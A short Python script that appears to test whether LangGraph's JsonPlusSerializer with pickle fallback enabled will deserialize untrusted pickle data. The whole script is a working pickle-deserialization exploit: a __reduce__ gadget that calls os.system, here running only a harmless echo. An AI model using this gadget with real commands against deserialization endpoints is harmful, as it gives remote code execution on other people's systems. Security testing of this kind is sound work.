from langgraph.checkpoint.serde.jsonplus import JsonPlusSerializer
import pickle

serde = JsonPlusSerializer(pickle_fallback=True)

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('echo EXPLOITED',))

data = pickle.dumps(Exploit())
try:
    serde.loads_typed(("pickle", data))
    print("VULNERABLE!")
except Exception as e:
    print(f"SECURE! {e}")
